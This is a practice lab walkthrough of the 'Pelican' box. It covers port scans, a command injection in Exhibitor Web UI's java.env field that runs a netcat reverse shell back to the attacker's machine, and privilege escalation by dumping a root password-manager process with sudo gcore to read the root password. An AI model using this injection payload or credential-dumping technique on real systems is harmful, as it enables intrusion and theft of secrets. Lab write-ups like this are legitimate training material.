---
Alias: Pelican
Date: 5/29/2022
Platform: Linux
Difficulty: Intermediate
Tags: RemoteCodeExecution-Exhibitor-Web-UI-1.71 /usr/bin/gcoreGTFOBINS /usr/bin/password-store strings
Status: Finished
IP: 192.168.192.98
---

# {{Pelican}}


# Resolution summary
- Found Exhibitor for zookeeper version 1 located on a webpage on port 8080
- Found Remote Code Execution - Exhibitor Web UI 1.7.1 exploit
- Followed the steps for the exploit and received a reverse shell
- Found user can run /usr/bin/gcore as sudo
- Googled /usr/bin/gcore and found the binary located in GTFOBINS
- Found the binary can perform privileged reads with process IDs
- Searched for processes that were running as root on target machine
- Found /usr/bin/password-store running on target machine as root
- Googled the binary and found it is standard unix password manager
- Ran the /usr/bin/gcore binary against the PID for the unix password manager and it created another file
- Utilized strings command to read the file and found root credentials
- Switched user to root on target machine; input found password and received a root shell

## Improved skills
- Utilizing "strings" command to read a file

## Used tools
- nmap
- rustscan

---

# Information Gathering
Scanned all TCP ports:
```bash
rustscan -a 192.168.192.98 --ulimit 5000                                         
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 192.168.192.98:22
Open 192.168.192.98:139
Open 192.168.192.98:445
Open 192.168.192.98:631
Open 192.168.192.98:2181
Open 192.168.192.98:2222
Open 192.168.192.98:8081
Open 192.168.192.98:8080
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-28 01:59 EDT
Initiating Ping Scan at 01:59
Scanning 192.168.192.98 [2 ports]
Completed Ping Scan at 01:59, 0.10s elapsed (1 total hosts)
Initiating Connect Scan at 01:59
Scanning pelican (192.168.192.98) [8 ports]
Discovered open port 8080/tcp on 192.168.192.98
Discovered open port 445/tcp on 192.168.192.98
Discovered open port 22/tcp on 192.168.192.98
Discovered open port 139/tcp on 192.168.192.98
Discovered open port 8081/tcp on 192.168.192.98
Discovered open port 631/tcp on 192.168.192.98
Discovered open port 2222/tcp on 192.168.192.98
Discovered open port 2181/tcp on 192.168.192.98
Completed Connect Scan at 01:59, 0.09s elapsed (8 total ports)
Nmap scan report for pelican (192.168.192.98)
Host is up, received conn-refused (0.095s latency).
Scanned at 2022-05-28 01:59:01 EDT for 0s

PORT     STATE SERVICE         REASON
22/tcp   open  ssh             syn-ack
139/tcp  open  netbios-ssn     syn-ack
445/tcp  open  microsoft-ds    syn-ack
631/tcp  open  ipp             syn-ack
2181/tcp open  eforward        syn-ack
2222/tcp open  EtherNetIP-1    syn-ack
8080/tcp open  http-proxy      syn-ack
8081/tcp open  blackice-icecap syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.38 seconds

# Nmap 7.92 scan initiated Sat May 28 01:53:18 2022 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /home/kali/Downloads/ProvingGroundsBoxes/Pelican/results/192.168.192.98/scans/_quick_tcp_nmap.txt -oX /home/kali/Downloads/ProvingGroundsBoxes/Pelican/results/192.168.192.98/scans/xml/_quick_tcp_nmap.xml 192.168.192.98
Nmap scan report for pelican (192.168.192.98)
Host is up, received user-set (0.081s latency).
Scanned at 2022-05-28 01:53:20 EDT for 23s
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE     REASON         VERSION
22/tcp   open  ssh         syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 a8:e1:60:68:be:f5:8e:70:70:54:b4:27:ee:9a:7e:7f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDssyyACw3AHaTatHhBU1VyBRbKOirrDG8M9IjpJPTf/v8mdIqiXk1HsBdoFZcsmWJVV4OXC7GMcHa+s0tZceTmgGf5TpiCB2yXUYPZre183LjJWM6KQMZVI0LHz9Yd3ji2bdD5jjtVxwnjrdx8GlU1THMGbzZivfSsPF18arMIq3ukYBS09Ov1SIKR4DJ7pjtBRutRBZKI/8/H+uB2u47AQRwbWuVaOmtZyDrfvgL/IqAFRQrbeP1VNQAErzHl8wNuk1vR+yROv0j7smTqoqqc8aB751O63gtBdCvKzpigwFDLyxYuzu8dW1Hh6ZQzaQZgWkw6SZeExAijK7yXSU61
|   256 bb:99:9a:45:3f:35:0b:b3:49:e6:cf:11:49:87:8d:94 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNUPmkVV/Q+iD07j1sFmdFWp7yppofTTgfzAhvMkyGPulIdMDbzFgW/pRAq3R3zZV7aEcWAMfFHgdXfj3W4FUuc=
|   256 f2:eb:fc:45:d7:e9:80:77:66:a3:93:53:de:00:57:9c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIPO1eLYoJ0AhVJ5NIDfaSrfUis34Bw5bKMMdFWzHPx0
139/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
631/tcp  open  ipp         syn-ack ttl 63 CUPS 2.2
|_http-title: Forbidden - CUPS v2.2.10
| http-methods: 
|   Supported Methods: GET HEAD OPTIONS POST PUT
|_  Potentially risky methods: PUT
|_http-server-header: CUPS/2.2 IPP/2.1
2222/tcp open  ssh         syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 a8:e1:60:68:be:f5:8e:70:70:54:b4:27:ee:9a:7e:7f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDssyyACw3AHaTatHhBU1VyBRbKOirrDG8M9IjpJPTf/v8mdIqiXk1HsBdoFZcsmWJVV4OXC7GMcHa+s0tZceTmgGf5TpiCB2yXUYPZre183LjJWM6KQMZVI0LHz9Yd3ji2bdD5jjtVxwnjrdx8GlU1THMGbzZivfSsPF18arMIq3ukYBS09Ov1SIKR4DJ7pjtBRutRBZKI/8/H+uB2u47AQRwbWuVaOmtZyDrfvgL/IqAFRQrbeP1VNQAErzHl8wNuk1vR+yROv0j7smTqoqqc8aB751O63gtBdCvKzpigwFDLyxYuzu8dW1Hh6ZQzaQZgWkw6SZeExAijK7yXSU61
|   256 bb:99:9a:45:3f:35:0b:b3:49:e6:cf:11:49:87:8d:94 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNUPmkVV/Q+iD07j1sFmdFWp7yppofTTgfzAhvMkyGPulIdMDbzFgW/pRAq3R3zZV7aEcWAMfFHgdXfj3W4FUuc=
|   256 f2:eb:fc:45:d7:e9:80:77:66:a3:93:53:de:00:57:9c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIPO1eLYoJ0AhVJ5NIDfaSrfUis34Bw5bKMMdFWzHPx0
8080/tcp open  http        syn-ack ttl 63 Jetty 1.0
|_http-title: Error 404 Not Found
|_http-server-header: Jetty(1.0)
8081/tcp open  http        syn-ack ttl 63 nginx 1.14.2
|_http-title: Did not follow redirect to http://pelican:8080/exhibitor/v1/ui/index.html
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.14.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-05-28T05:53:38
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: pelican
|   NetBIOS computer name: PELICAN\x00
|   Domain name: \x00
|   FQDN: pelican
|_  System time: 2022-05-28T01:53:36-04:00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 50373/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 50889/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 59292/udp): CLEAN (Timeout)
|   Check 4 (port 24103/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 1h20m00s, deviation: 2h18m34s, median: 0s

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat May 28 01:53:43 2022 -- 1 IP address (1 host up) scanned in 25.61 seconds

```

Enumerated open TCP ports:
```bash
8080
```

Enumerated top 200 UDP ports:
```bash

```

---

# Enumeration
## Port 8080 - HTTP Jetty 1.0

#### -Navigated to "http://192.168.192.98:8081" and was redirected to "http://192.168.192.98:8080/exhibitor/v1/ui/index.html":

![](Images/Pasted%20image%2020221029153108.png)

#### -Googled "Exhibitor for ZooKeeper v1.0 exploit" and found the following exploit steps:

![](Images/Pasted%20image%2020221029153214.png)
![](Images/Pasted%20image%2020221029153255.png)
![](Images/Pasted%20image%2020221029153321.png)
#RemoteCodeExecution-ExhibitorWebUI1.71
---

# Exploitation
## Name of the technique
## Remote Code Execution - Exhibitor Web UI 1.7.1

#### -Clicked on the Config tab, then flipped the Editing switch to ON. Typed " $(/bin/nc -e /bin/sh [kali IP] 631 &)" in the java.env script area:

![](Images/Pasted%20image%2020221029153712.png)
![](Images/Pasted%20image%2020221029153742.png)

#### -Started a penelope listener on my kali machine listening on port 631

#### -Clicked "Commit" > "All At Once" > "OK" and waited about a minute for the script to run and received a reverse shell:

![](Images/Pasted%20image%2020221029153837.png)

---

# Lateral Movement to user
## Local Enumeration

#### -Typed "sudo -l" and found user charles can run "/usr/bin/gcore" as sudo:

![](Images/Pasted%20image%2020221029154227.png)

#### -Googled "/usr/bin/gcore" and found the binary in GTFOBINS

![](Images/Pasted%20image%2020221029154932.png)

#### - Per GTFOBINS the /usr/bin/gcore can be utilized to do privileged reads or disclose files outside a restricted file system.

![](Images/Pasted%20image%2020221029155123.png)
#/usr/bin/gcoreGTFOBINS 

#### - Typed "ps aux | grep root" to find which processes were running with root privileges and found "/usr/bin/password-store" running as root:

![](Images/Pasted%20image%2020221029154326.png)
#/usr/bin/password-store

#### -Googled "/usr/bin/password-store" and found it to be a standard unix password manager

![](Images/Pasted%20image%2020221029154416.png)
![](Images/Pasted%20image%2020221029154455.png)


## Lateral Movement vector
## Read root password from standard unix password manager (/usr/bin/password-store)

#### - Typed "sudo /usr/bin/gcore 493" (which is the PID of /usr/bin/password-store) which created file "core.493":

![](Images/Pasted%20image%2020221029155334.png)

#### - Typed "strings core.493" and found roots password "ClogKingpinInning731":

![](Images/Pasted%20image%2020221029155429.png)
![](Images/Pasted%20image%2020221029155622.png)

---

# Privilege Escalation


## Privilege Escalation vector
## Input found root credentials

#### -Typed "su root" then provided found password "ClogKingpinInning731" and received a root shell:

![](Images/Pasted%20image%2020221029155802.png)



---
